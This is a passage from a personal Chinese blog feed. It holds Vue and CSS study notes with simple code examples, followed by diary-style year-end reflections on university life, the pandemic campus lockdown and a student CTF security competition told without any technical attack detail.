value } }) 数据代理 何为数据代理？通过一个对象来修改另一个对象。\n例如，obj={x:100}\nobj2={y:200}\n使用Object.defineProperty方法，设置obj2的x属性get和set方法与obj绑定\n1 2 3 4 5 6 7 8 Object.defineProperty(obj2,\u0026#39;x\u0026#39;,{ get(){ return obj.x }, set(value){ obj.x = value } }) 在script标签里设置的data属性值，绑定的是vm中的_data属性\nVue中的数据代理： 通过vm对象来代理data对象中属性的操作（读/写） Vue中数据代理的好处： 更加方便的操作data中的数据 基本原理： 通过0bject.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。\n事件处理 事件的基本使用：\n使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名； 事件的回调需要配置在methods对象中，最终会在vm上； methods中配置的函数，不要用箭头函数！否则this就不是vm了； methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象； @click=\u0026ldquo;demo\u0026rdquo; 和 @click=\u0026ldquo;demo($event)\u0026ldquo;效果一致，但后者可以传参； @click=\u0026ldquo;yyy\u0026rdquo;，其中yyy可以写一些简单的语句 事件修饰符 使用示例\n1 \u0026lt;a href=\u0026#34;xxx\u0026#34; @click.prevent=\u0026#34;showInfo\u0026#34;\u0026gt; event事件中可以使用e.preventDefault()阻止默认事件，vue中可以使用@click.prevent=\u0026lsquo;xxx\u0026rsquo;的修饰方式使用该方法。\n扫盲：\n事件冒泡 ：当一个元素接收到事件的时候 会把他接收到的事件传给自己的父级，一直到window 。（注意这里传递的仅仅是事件 并不传递所绑定的事件函数。所以如果父级没有绑定事件函数，就算传递了事件 也不会有什么表现 但事件确实传递了。）\n事件捕获和事件冒泡：DOM2级事件’规定的事件流包含3个阶段，事件捕获阶段、处于目标阶段、事件冒泡阶段。首先发生的事件捕获为截获事件提供机会，然后是实际的目标接收事件，最后一个阶段是事件冒泡阶段，可以在这个阶段对事件做出响应。https://www.cnblogs.com/christineqing/p/7607113.html\nVue中的事件修饰符： 1.prevent：阻止默认事件（常用）； 2.stop：阻止事件冒泡（常用）； 3.once：事件只触发一次（常用）； 4.capture：使用事件的捕获模式（捕获阶段就执行函数）； 5.self：只有event.target是当前操作的元素时才触发事件； 6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕（比如scroll和wheel事件，wheel回调函数很麻烦的时候，可以使用passive优先执行滚轮默认行为）；\n键盘事件 使用方法示例\n1 \u0026lt;input @keydown.enter=\u0026#34;showInfo\u0026#34;\u0026gt; Vue中常用的按键别名： 回车 =\u0026gt; enter 删除 =\u0026gt; delete（捕获“删除”和“退格） 退出 =\u0026gt; esc 空格 =\u0026gt; space 换行 =\u0026gt; tab（特殊，必须配合keydown去使用） 上 =\u0026gt; up 下 =\u0026gt; down 左 =\u0026gt; left 右 =\u0026gt; right Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要keyab-case（驼峰命名改为短横线命名） 系统修饰键（用法特殊）：ctrl、alt、shift、meta 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。 配合keydown使用：正常触发事件。 也可以使用keyCode去指定具体的按键（不推荐） Vue.config.keyCodes.自定义键名 = 键去定制按键别名 小tips 修饰符可以连续写比如@click.prevent.stop和@keydown.ctrl.y\n计算属性 vue中绑定的数据修改时，vue会重新解析模板。\n使用示例\n1 2 3 4 5 6 7 computed{ fullName:{ get(){ return firstName + lastName } } } 计算属性定义：根据已有的属性进行一些计算加工生成的新属性就叫计算属性。使用配置项computed，计算属性最终会在vm对象身上，但是不在_data里。\n原理：底层借助了Objcet.defineproperty方法提供的gtter和setter。\n计算属性的值使用getter调用，多次调用会使用缓存，getter什么时候调用？\n初次读取计算属性时 所依赖的数据发生改变时 如果计算属性要被修改，必须使用set函数响应修改，切记set函数中要修改依赖的属性\n简写 确定只读取不修改可以使用简写模式。示例\n1 2 3 fullNmae(){ return } 监视属性 配置对象watch:{}，代码示例\n1 2 3 4 5 6 7 8 9 watch：{ isHot:{ immediate:true，//初始化时让handler调用一下 //handler什么时候调用？当isHot发生改变时。 handler(newValue,oldValue){ console.log(\u0026#34;isHot被修改了\u0026#39;,newValue,oldValue) } } } 监视属性也可以监视计算属性，监视属性的另一种写法\n1 2 3 vm.$wathc(\u0026#39;变量名\u0026#39;,{配置项同上 }) 深度监视 Vue中的watch默认不监测对象内部值的改变，配置deep:true可以监测对象内部值的改变。Vue自身可以监测对象内部值的改变，但是Vue提供的watch默认不可以，使用watch的时候根据数据的具体结构，决定是否采用深度监视。\n有简写形式\n监视属性vs计算属性 还是要看具体需求。\ncomputed能完成的功能，watch都可以完成。 watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。 两个重要的小原则：\n所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等），最好写成箭函数，这样this的指向才是vm或组件实例对象。 绑定样式 class样式 写法：class=\u0026ldquo;xxx\u0026rdquo; xxx可以是字符串、对象、数组。 字符串写法适用于：类名不确定，要动态获取。 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。 style样式 :style=\u0026quot;{fontSize：xxx}\u0026ldquo;其中xxx是动态值。 :style=\u0026quot;[a,b]\u0026ldquo;其中a、b是样式对象。 条件渲染 v-if写法： (1).v-if=\u0026ldquo;表达式\u0026rdquo; (2)v-else-if=\u0026ldquo;表达式\u0026rdquo; (3).v-else=\u0026ldquo;表达式\u0026rdquo; 适用于：切换频率较低的场景。 特点：不展示的DOM元素直接被移除。 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。\nv-show写法：v-show=\u0026ldquo;表达武\u0026rdquo; 适用于：切换频率较高的场景。 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。\n备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。\n还有一个点if和template配合使用保持原来的html结构\n列表渲染 v-for指令：\n用于展示列表数据 语法：v-for=\u0026quot;(item,index)in xxx\u0026rsquo;\u0026quot;:key=\u0026ldquo;yyy\u0026rdquo; 可遍历：数组、对象、字符串（用的很少）、指定次数(用的很少) key的作用和原理\n面试题：react、vue中的key有什么作用？(key的内部原理)\n虚拟DoM中key的作用： key是虚拟DoM对象的标识，当数据发生变化时，Vue会根据新数据生成新的虚拟DoM,随后Vue进行新虚拟DoM与旧虚拟DoM的差异比较，比较规则如下：\n对比规则：\n旧虚拟DoM中找到了与新虚拟DoM相同的key。\n若虚拟DoM中内容没变，直接使用之前的真实DoM！\n若虚拟DoM中内容变了，则生成新的真实DoM,随后替换掉页面中之前的真实D0M。\n旧拟DoM中未找到与新虚拟DoM相同的key\n创建新的真实DOM,随后渲染到到页面。\n用index作为key可能会发的问题： 若对数据进行：逆序添加、逆序明除等破坏顺序操作，会产生没有必要的真实DoM更新==\u0026gt;界面效果没问题，但效率低。\n如果结构中还包含输入类的DoM，会产生错误DoM更新==\u0026gt;界面而有问题。\n开发中如何选择key？ 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。 如果不存在对数据的逆序添加、逆序则除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。\n列表排序\u0026amp;过滤 能用computed的就不用watch\n监测数据的原理 对象的检测 首先对data数据进行加工，设置响应式的getter和setter，大概的核心代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 let data = { name:\u0026#34;xx\u0026#34;, address:\u0026#34;dd\u0026#34; } const obs = new Observer(data) let vm={} vm._data = data = obs function Observer(obj){ //汇总对象里的属性形成一个数组 keys = Object.keys(obj) //遍历 keys.forEach(k =\u0026gt; { Object.defineProperties(this,k,{ get(){ return obj[k] }, set(val){ //Vue重新模板解析 obj[k] = val } }) }); } 并且Vue底层使用递归的方式对所有嵌套的对象属性都进行了数据监测方法的加工。\nVue提供了一个API的set方法Vue.set()或vm.$set()，可以为已经创建的对象添加响应式的属性。传入参数列表：target，key，val。局限性：target对象不能是Vue实例或者Vue实例的根数据对象。\n数据的检测 通过包裹数组中更新元素的方法实现，本质上做了两件事\n调用原型中的数组更新方法 Vue重新进行模板解析，更新页面 Vue包裹的7种方法：\npush() pop() shift() unshift() splice() sort() reverse() 也可以使用Vue提供的API：Vue.set()或vm.$set()\n收集表单数据 根据\u0026lt;input\u0026gt;标签的类型不同，v-model收集的值也不同，分为以下几种情况\ntext类型。收集的是value属性 radio类型。收集的同样是value属性，但是需要给标签配置value值并成组 checkbox类型。如果没有配置value属性，收集的是选项框的checked属性。如果配置了value属性，根据v-model绑定属性的初始值不同有两种情况：1.绑定属性初始值为非数组，收集的是checked属性。2.绑定属性为数组，收集的就是value组成的数组 v-model的三个常用修饰符：\nlazy。输入框失去焦点时收集数据 number。输入字符串为有效数字 trim。过滤首尾空格 过滤器 对数据进行格式化显示。语法：\n注册过滤器：全局注册Vue.filter(name,callback) 或 局部注册new Vue{filters{}}\n使用过滤器：{{xxx | filter}} 或 v-bind:属性 = xxx | filter\n过滤器可以接受多个参数，第一个默认是管道符前的数据。多个管道符可以串联（按顺序调用）\n内置指令 v-bind：单项绑定解析表达式可以简写为:xxx\nv-model：双向绑定数据\nv-for：遍历数组/字符串/对象\nv-on：绑定事件监听，可以简写为@\nv-if（v-else）：条件渲染\nv-show：控制节点是否展示\nv-test：所在节点渲染文本内容。和插值语法区别，前者会直接替换掉节点里的内容，插值语法不会。\nv-html：向所在节点渲染包含html结构的内容。指令可以识别html结构。但是要注意XSS攻击\n","date":"2022-03-07T18:16:47+08:00","permalink":"https://www.braindance.top/articles/2022/03/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"Vue学习笔记"},{"content":"选择器 element p 选择所有 \u0026lt;p\u0026gt; 元素。 element.class p.intro 选择 class=\u0026ldquo;intro\u0026rdquo; 的所有 \u0026lt;p\u0026gt; 元素。 element,element div, p 选择所有 \u0026lt;div\u0026gt; 元素和所有 \u0026lt;p\u0026gt; 元素。 element element div p 选择 \u0026lt;div\u0026gt; 元素内的所有 \u0026lt;p\u0026gt; 元素。 element\u0026gt;element div \u0026gt; p 选择父元素是 \u0026lt;div\u0026gt; 的所有 \u0026lt;p\u0026gt; 元素。 element+element div + p 选择紧跟 \u0026lt;div\u0026gt; 元素的首个 \u0026lt;p\u0026gt; 元素。 element1~element2 p ~ ul 选择前面有 \u0026lt;p\u0026gt; 元素的每个 \u0026lt;ul\u0026gt; 元素。 选择器的权重 选择器权重（从上往下优先级变低）：\n内联样式\nid选择器\n类和伪类选择器\n元素选择器\n通配选择器\n继承优先级（没有优先级）\n比较优先级时，需要将所有选择器的优先级相加计算，最后优先级越高的优先显示（分组选择器是单独计算的）\n1 2 div#box (相加计算) div,p,span\t(单独计算) 如果优先级计算后相同，则根据代码最后设置的样式显示。\n可以在样式后后面添加!important，可以获得最高优先级（慎用）\na标签样式顺序：https://www.cnblogs.com/Yirannnnnn/p/4540061.html\n像素和百分比 像素 屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。\n百分比 相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。\nem 相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。\nrem 相对根元素（html字体大小）字体大小计算。\nRGB值 RGB通过三种颜色的不同浓度来调配出不同的颜色\nR red, G green,B blue\n每一种颜色的范围在0 - 255 (0% - 100%) 之间，语法: RGB(红色，绿色,蓝色)\nRGBA 就是在rgb的基础上增加了一个a表示不透明度，需要四个值，前三个和rgb一样，第四个表示不透明度（最大值1），1表示完全不透明0表示完全 透明5 半透明。\n十六进制的RGB值 #红色绿色蓝色\n两位重复可以缩写\nHSL值 H\t色相（0-360）\nS\t饱和度，颜色的浓度（0-100%）\nL\t亮度，颜色的亮度（0-100%）\nHSLA\n布局 文档流(normal flow) 网页是一个多层的结构，一层摞着一层通过CSS可以分别为每一层来设置样式，作为用户来讲只能看到最顶上一层，这些层中，最底下的一层称为文档流，文档流是网页的基础，我们所创建的元素默认都是在文档流中进行排列，对于我们来元素主要有两个状态：\n在文档流中 不在文档流中(脱离文档流) 元素在文档流中有什么特点:\n块元素 块元素会在页面中独占一行(自上向下垂直排列) 默认宽度是父元素的全部(会把父元素撑满) 默认高度是被内容撑开(子元素) 行内元素 行内元素不会独占页面的一行，只占自身的大小 行内元素在页面中左向右水平排列，如果行之中不能则元素 会换到第二行继续自左向右排列(书写习惯一样) 行内元素的默认宽度和高度都是被内容撑开 盒子模型(box model) CSS页面将所有的元素设置为了一个矩形的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成：\n内容区(content) 内边距(padding) 边框(border) 外边距(margin) 内容区(content) 内容区大小由 width 和 height 两个属性来设置。\n边框(border) 盒子的边缘，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式：\n边框的宽度 border-width 默认3px。简写值可有四个：\n四个值：上、下、左、右\n三个值：上、左右、下\n两个：上下、左右\n一个值：上下左右\n还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度\n边框的颜色 border-color 规则同边框的宽度 border-width，如果忽略自动使用color颜色\n边框的样式 border-style 规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线\n边框可以简写一个属性border按以上三个属性值顺序使用\n内边距(padding) 四个方向：top、right、bottom、left。内边距设置会影响盒子大小，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。\n外边距(margin) 外边距不会影响盒子可见框大小，影响盒子位置，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上\n水平方向的布局 元素在其父元素水平方向的位置由以下七个属性共同决定\n1 margin-left + border-left + padding-left + width + padding-right + border-right + margin-right = 其父 元素内容区的宽度(必须满足) 如果等式不成立，则成为过度约束，等式会自动调整。调整情况：\n如果七个值没有值为auto的情况，浏览器会调整margin\n如果某一个属性值为auto，则调整此属性的值使等式成立\n如果将一个宽度和一个外边距设置为auto，则宽度会调整到最大，设置为auto的外边距会自动为0\n如果将三个值都设置为auto，则外边距都是0，宽度最大\n如果将两个外边距设置为auto，宽度固定值，则会将外边距设置为相同的值所以我们经常利用这个特点来使一个元素 在其父元素中水平居中\n示例: width:xxxpx; margin:0 auto;\n垂直方向的布局 子元素在父元素内容区排列，如果子元素大小超过了父元素，则会从父元素中溢出(overflow)，使用overflow属性设置父元素对溢出子元素的处理。可选值：\nvisible 默认值子元素会从父元素中溢出，在父元素外部的位置显示 hidden 溢出内容将会被裁剪不会显示 scroll 生成两个滚动条，通过滚动条来查看完整的内容 auto 根据需要生成滚动条 垂直外边距折叠 相邻的垂直方向外边距会发生重叠现象。有以下两种情况\n兄弟元素之间 兄弟元素间的相邻垂直外边距会取两者之间的较大值(两者都是正值) 特殊情况:\n如果相邻的外边距一正一负，则取两者的和。 如果相邻的外边距都是负值，则取两者中绝对值较大的 同号折叠(取最大值)，异号相加。兄弟元素之间的外边距的重叠，对于开发是有利的，所以不需要进行处理\n父子元素 父子元素间相邻外边距，子元素的会传递给父元素(上外边距) ，父子外边距的折叠会影响到页面的布局，必须要进行处理\n行内元素盒模型 行内元素不支持设置宽度和高度，但是可以设置padding、border、margin，设置属性后不垂直方向不会影响页面布局。\ndisplay用来设置元素显示类型，可选值：\ninline 将元素设置为行内元素 block 将元素设置为块元素 inline-block 将元素设置为行内元素，行内块，既可以设置高宽又不会独占一行 table 将元素设置为一个表格 none 元素不在页面中显示 visibility用来设置元素的显示状态，可选值：\nvisible 默认值，元素在页面中正常显示 hidden 元素在页面中隐藏不显示，但是占据页面位置 浏览器默认样式 通常情况，浏览器都会为元素设置一些默认样式，默认样式会影响页面布局，需要去除浏览器默认样式。\n1 2 3 4 *{ margin: 0; padding: 0; } 真正项目还是需要一个一个标签清除标签。\n清除默认样式表\nnormalize.css\t对默认样式进行了统一\nreset.css\t直接去除了浏览器的默认样式\n盒子的尺寸 默认情况下，盒子可见框大小由内容区、内边距、边框共同决定。可以设置box-sizing属性值设置盒子尺寸计算方式：\ncontent-box 默认值，宽度高度设置内容区大小 border-box 宽度高度值设置整个盒子可见框大小，即会调整自动调整内容区大小 轮廓阴影和圆角 box-shadow设置元素阴影样式，阴影不会影响页面布局。缩写格式\n1 box-shadow: 水平偏移量 垂直偏移量 阴影的模糊半径 阴影的颜色 outline属性用来设置元素的轮廓线，用法和border一样，区别是轮廓线不会影响可见框大小，边框占用可见框大小。\nborder-radius属性设置圆角，圆角设置园的半径大小\n浮动\n浮动 浮动主要作用是让页面中的元素进行水平排列。\n浮动的特点：\n浮动的元素会完全脱离文档流，不在占据文档中的位置。不需要满足水平等式 设置浮动会向父元素的左侧或右侧移动。浮动元素默认不会从父元素中移出 浮动元素向左向右移动时不会超过它前面的元素。向上也不会高过前一个兄弟元素。 脱离文档流的特点：\n块元素不在独占页面一行，高度和宽度默认被内容撑开。行内元素脱离文档流以后会变成块元素，特点和块元素一样。脱离文档流以后，不需要区分块元素和行内元素了。\n高度塌陷 指在浮动布局中，父元素的高度是由子元素撑开的，但是子元素设置浮动以后脱离文档流，无法撑起父元素导致父元素高度丢失。父元素高度丢失后进一步导致页面布局混乱。\n解决办法：为父元素开启BFC（Block Formatting Context）块级格式化环境，开启BFC以后该元素会变成一个独立的布局区域。特点包括：\n不会被浮动元素所覆盖 子元素和父元素外边距不会重叠 元素可以包含浮动的子元素 开启BFC的方法：\n设置元素浮动（不推荐） 设置元素为行内块元素（会失去宽度） 设置overflow属性为一个非visible的值(hidden) Block formatting context\nclear属性 如果不希望某个元素受到其他浮动元素的影响而改变位置，可以设置clear属性清除影响。可选值：left、right、both（清除两侧中最大影响的那侧）。原理：设置清除浮动以后，浏览器会为元素添加一个上边距，使其位置不受其他元素影响。\n使用after伪解决高度塌陷 使需要浮动的子类后跟一个清除浮动影响的兄弟类，并设置为块元素独占一行。\n1 2 3 4 .box1::after{ display: block; clear: both; } 同样的概念可以解决父类和子类外边距重叠问题\n1 2 3 .box1::before{ display: table; } clearfix类可以同时解决高度塌陷和外边距重叠问题\n1 2 3 4 5 6 .clearfix::before, .clearfix::after{ content:\u0026#39;\u0026#39;; display: table; clear: both; } 定位 通过定位可以将元素摆放到页面中的任意位置，使用position属性来设置定位。可选值：\nstatic，默认值，元素是静止的没有开启定位 relative，相对定位 absolute，绝对定位 fixed，固定定位 sticky，粘滞定位 相对定位 使用relative相对定位以后，需要设置offset偏移量来设置元素位置，可选值：top、bottom、left、right，偏移量相对的位置是元素原来在文档流中的位置。\n开启相对定位以后会提升元素层级，但是没有脱离文档流。不会元素的性质（块、行内）\n绝对定位 使用absolute绝对定位以后：\n元素会从文档流中脱离，并且改变元素性质（行内变块，宽高被内容撑开）\n元素提升一个层级\n绝对定位是相对于去包含块进行定位的\n包含块指离当前元素最近的祖先块元素，行内元素可不能算。\n绝对定位的包含块：离元素最近的，并且开启了定位的祖先元素，如果所有祖先元素都没有开启，则根元素html就是初始包含块。自绝父相\n固定定位 fixed固定定位大部分特点和absolute绝对定位相同，唯一不同的是固定定位永远参照于浏览器的窗口进行定位。广告位\n粘滞定位 sticky粘滞定位大部分特点和relative相对定位相同，唯一不同的是可以设置offset属性在其经过滚动到达某个位置时将其固定。IE不兼容\n补充 开启定位后，水平方向布局等式需要添加offset属性的值。\n开启定位以后，可以通过设置z-index属性来设置元素层级。越大层级越高，如果为设置层级，则根据元素顺序显示最后的元素。祖先元素的层级再高也不会盖住后代元素\n","date":"2022-02-15T09:28:06+08:00","permalink":"https://www.braindance.top/articles/2022/02/css%E5%AD%A6%E4%B9%A0/","title":"CSS学习"},{"content":"已经二月才写年度总结的估计只有我把，纯纯的懒狗一条。\n个人总结 学业 因为加入了学校组织的DROPS集训队，整个人都把精力投入在里面了，然后把自己学习的笔记和经验总结起来写在博客里，有种丰收的喜悦。和集训队的队友们每周会有分享会，然后还去参加了几次大型的比赛，让我知道天外有天人外有人，经常把自己缩在自己的小圈子里，再厉害也就仅限于自己的小圈子。\n下半年的考研，觉得自己努力了，但是又觉得没有努力，还是目标不够明确吧，考研的目标一降再降，最后觉得要个文凭都差不多了，和其他的大佬比起来，自己辣鸡也不是没有原因的，志向都不一样，但是又想成为厉害的人。如果考研不成功的话就打算去就业。\n目前的程度也就是在github上找一些项目自己部署到服务器，看着项目的文档自己进行一些配置，感觉距离开发越走越远了，偶尔会找一找项目的代码自己DIY点，确实也挺迷茫的，学又学不进去，之前的学校教的也忘得差不多了，感觉还是考研后和行业脱节了，将来要后追起来。\n感情 网上认识了一个网友，一起聊了很久最后算是开始了一段网恋吧，但是感觉自己经验还是很少，并且有点喜欢没有拘束的感觉，经常打游戏忘了她，觉得挺内疚的。之前的我也算是个一毛不拔的人，然后开始慢慢的会给她准备一些小礼物，和她在一起也确实让我变得开朗些，不光是和她在一起的时候，和其他的朋友心灵上的交流也变多了，和她在一起也当我打开了心扉吧。\n学会用github 现在才知道github上的项目真的是人类智慧的结晶，在上面找了好多有趣的项目，目前自己部署的有两个网盘、青龙面板(懂的都懂)、自己的跳板机一堆，想整点什么小工具就可以在上面找到有一样想法的人，然后借鉴一下人家的代码是如何实现的。看一些高分的项目，大概知道了些目前的项目都实现了啥样牛逼的功能，还有一些模块功能的项目，多看些这种，如果将来自己项目开发遇到一样的功能就可能有很大的帮助。\n思考 写博客真的是个记录自己成长的过程的好东西，以后坚持。\n走出自己的舒适圈，去看看外面的世界有多大，才知道目前的实力根本不够支撑自己的梦想。\n不管遇到什么样的困难，只要觉得目前的路是对的，硬着头皮顶下去，事情总会发生一些转变。\n希望能坚持一个目标一直走下去吧。\n*保持你的决心❤️\n","date":"2022-02-07T11:04:02+08:00","permalink":"https://www.braindance.top/articles/2022/02/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","title":"2021年度总结"},{"content":"新年快乐🤗 年度总结被拖到了农历的年。。。确实是自己懒得离谱（确实懒嗷，这篇文章写了四天了）。年前想写但是又想迁移博客，所以没干，年后家里又置办年货要搭把手，现在咣里咣当就到初二了，属实过太快了。\n本来打算写年度总结，但是觉得太长了就改成年度日记吧。我看着手机相册，想起来什么写什么吧。（多图警告⚠️⚠️⚠️）\n1-2月 回家祭祖的时候遇到了两只大鹅，憨憨的看着我\n真的是人生第一次吃必胜客的披萨，因为是个宅所以出校门的机会都不多。(真心觉得必胜客的披萨也就一般般)\n在小黑盒上抽奖，中了一个鼠标垫，人生第二次网络上中奖，最重要的还是隔了半个月连中。\n第一次中奖是B站的一个up名字叫大果粒粒，一周一更的搞笑视频，属于是生活必需品了，周指活。中了50块红包😋\n3-5月 三月份吧，去学校就是被封在里面，好像一直到6月份放暑假都在学校，只有周日可以出去一天，我们学校还是一个单独一个学院在市中心，地方也不大真能憋死人。打听我发小的学校，通知说的到学校需要14天隔离，但是到学校第二天就睁一只眼闭一只眼，随便出门了，岂可修。\n现在疫情还没放开，去学校的话估计还是要封校，我和室友们都讨论过这话题，我们上了大学四年因为疫情姑且在学校封了半年，我们下面的2019级，到学校也就出门过半年，现在都封校到大三了，更惨的是2020级新生，从进学校就被封在里面，现在已经大二了，这感觉真的是换了个地方上高中。\n我们学校上面的领导也是脑子不好使，整个学校除了学生，其他任何人都可以随便出入，包括我们学校被当做停车场这件事，只要你给钱，我们学校车随便停，所以也有了学生开着车把人带出去，这件事更离谱，学工办的老师都把监控调出来了，清清楚楚看见车牌，没有去车管所找这辆车车主是谁，反而在学校的班长群里问车里出来的人谁认识。学校还有各种事真听得脑壳疼。\n继续流水账。\n宿舍某次出门聚餐吃了烤羊腿，这个腿啊，真的是一言难尽，我们宿舍6个人带个蹭饭的同学7个人，这个羊腿的套餐没份都不够，比如只有4-5个，让我们分的很不舒服，并且这个腿吃着完全没有味道！好多地方嚼不动。已经被我标记了\n今年更得番《奇蛋物语》感觉太棒了，剧情讲的很完美，每个女生都有自己的伤口，也都有自己战斗的理由。很多角色身上的弱点性格，在自己身边和自己身上都有见过，只是当时的自己也没有深入思考过如何面对，看这部番也给了一个自己思考的机会。总之就是看完以后然我也觉得充满了力量。\n我姐在她楼下的蛋糕店办了个卡，办卡送了一个蛋糕但是我姐一个人吃不完，刚好我和爸妈一起去我姐那，就把蛋糕领回家吃了。🐭🐭我啊，最喜欢吃甜甜的蛋糕了\n我姐特别想养小狗，让我舅帮忙找了一只崽回家，看这睡得狗仰马翻，还有一张闻着我臭jio睡的就不发了。再多的就不说了。\n在宿舍基本上就是一星期总要喝一桶可乐，后来觉得不养生室友就一起买那种临期奶，又便宜又能换换口味，当时我们宿舍和室友的女朋友的宿舍，一起合买了17箱奶，后来还是一两个星期都干差不多了。冰山一角↓\n对面宿舍买了个包子玩具，说是解压玩儿的，这我不好说了。我和一个室友看上了，也在网上买了两个\n我找到了一张照片，是我早上爬起来发现嘴边有点痒，用照相机一拍，原来是蚊子在我嘴上叮了一口，我淦\n2021年4月18日，Steam上的《绣湖:旅馆》白给了，可惜已经买了被小刺。\n给我爸换了新手机红米K40。\n我姐NS到了，让我盯着游戏打折买游戏，当时买了健身环、动森。后来打折还买了塞尔达、分手厨房、奥德赛。\n大概5月份成了预备党员。\n指环王重映了，这估计是我姐在高中那会看的，想再看一遍但又找不到人，就叫上我一起，我顺便蹭我姐饭/大笑。那阵子指环王是一周上一一部，一共三部曲看了三个星期。\n6月 在宿舍楼里看到外面风景很棒，就随手拍了\n还有一天，外面狂风大作，感觉吹得风打的雷劈的闪电都能把楼给拆了，但是那天却可以在宿舍里暖暖和和的打游戏，头一次在宿舍感觉到了家的感觉😂（过了几天还有一件大事，只我知道，标下日期2021.6.4）\n在我姐那，刚好举着手机拍外面，发现了一个自由的气球上天了\n在我姐那玩的健身环，这游戏雀食好啊，雀食好\n人生第一次出去打比赛去河大打的，大佬说比赛是非常非常非常非常非常非常水的比赛，我们组只拿了三等奖，不过算是体验一把了，下面这个颁奖仪式还有个视频被传网上很火，B站视频找不到了，贴个相关的新闻里面有视频。主要还是体验一把学校报销费用打比赛。\n今天在学校还学成了点外卖，一个星期就要去吃一次汉堡，主要还是学校食堂太小，一进里面就根本想不出哪家的饭还能吃下，越想越想直接扭头回宿舍。为此我还在闲鱼上买了个饿了吗年卡，30块，有点膈应的就是会找你要验证码，在卖家哪登陆，这么便宜主要还是把淘宝上的88会员给拆开卖了，我还买过一年的网易云黑胶40多。\n这是半个榴莲，我同学的表弟给他送过去吃，他带回宿舍室友都不吃，臭味多少有点冲，吃不完就给我了，我和我一个室友知道这榴莲可是大补，两个人一会儿怼了一半😋\n下半年打的全国大学生信息安全竞赛，本来我觉得自己刚加集训队菜的离谱，大佬们还是带着我组了四人队，先是线上赛打了两天，集训队的两个队伍进分赛区了，接下来去的武汉华科大打的，看了看人家学校真的是慕的直流口水，人家这学校才叫大学。分赛区的举办方在有点远的地方包了酒店，原价380一晚的房间选手只用100多还是200多我忘了，反正那个酒店是我目前住过最豪华的（反正自己也没住过多少酒店就是了），大大的落地窗还有小冰柜，冰柜里面还有可乐雪碧，太爽咯！早上自助餐也挺丰盛。\n选手就位\n最后成绩是打了分赛区的第二名一等奖，有了总决赛资格，分赛区第一名是三巨头实在打不过。打完比赛回学校集训队老师还发了新闻到学校官网，人生第一次上学校官网新闻。\n同学空间整活，直呼太艺术了\n7月 最奇妙的一个月\n在家里屋顶上拍的好风景\n接下来就是去哈工大打总决赛，是第二次坐飞机，第一次坐飞机是和我姐去贝加尔湖。专门挑的挨窗户的位置，但是这个窗户有划痕拍的不好看\n飞机餐没啥看的就不放了，还有一张拍了很小很小很小的月亮\n哈尔滨站\n刚到的第一个酒店进去就一股霉味，然后整个房间都是那种很阴森的感觉，我们四个人都觉的不太舒服就换了个。\n第一次去哈工大\n晚上也不知道怎么吃饭，就几个人一起出去吃了铁锅炖大鹅，听了好久了终于吃上一次正宗的。\n然后就是比赛的内容了。\n总结这次比赛就是我们被爆锤，对比赛的重点没有把握好，第一天CTF算是比较正常的题，就是每个队伍的题是抽的，有的队伍抽的简单题就小不公平，然后就是加了一个叫可信计算的题目，大伙基本上都是第一次听说，比赛让我负责的这块我摸索了半天也没啥头绪，不过其他队伍也没解出多少。（最后比赛完听有的队伍说，有一道题的git仓库没有删掉，可以利用分支回溯原来的代码，太艹了）\n第二天是被吊起来打的一天，我们队经验最多的总共也就参加过2-3次AWD比赛，这次比赛还禁用了靶机一些指令导致防御方面失算了，不过主要原因也怪我，因为我是主要负责这个方面的，分赛区的时候用WatchBird太舒服了，导致这次比赛大意了还是想一招吃遍天，这次比赛注重的就是防御，因为靶机一轮如果被攻击就会直接扣100分，但是攻击一次其他队伍才2分，总共也就80多个队伍，算上防御完美的想要稳分数只有不被打。然后我们比赛还出现了最逆天的一幕，因为靶机宕机会扣分，比赛有一个队伍没人来按理说应该是最后一名，但是我们队因为一直被打，然后修的慌慌张张导致好几轮靶机宕机，我们是倒一！\n这次总决赛属实是拉胯了，不过也真心地明白了自己是有多菜，之前分赛区的成绩很彩但也不好说。第一天打完老师就把我们叫到宾馆好好说了一顿，老师说他们也不容易向学校申请我们这次来的经费，然后拿个三等奖才刚好能把费用持平blablabla，还好总决赛不算太激烈，80个队伍79个都能拿到奖，最后我们也是拿了个三等奖末尾回家了。\n比赛还有最吸引人的地方就是华为之夜，因为华为是举办方所以晚上有顿大餐，所以我们打进总决赛还有个目标就是华为之夜。\n入场的时候会发一张奖券，然后主持人就在上面组织一场小游戏抽一波奖，大伙都在下面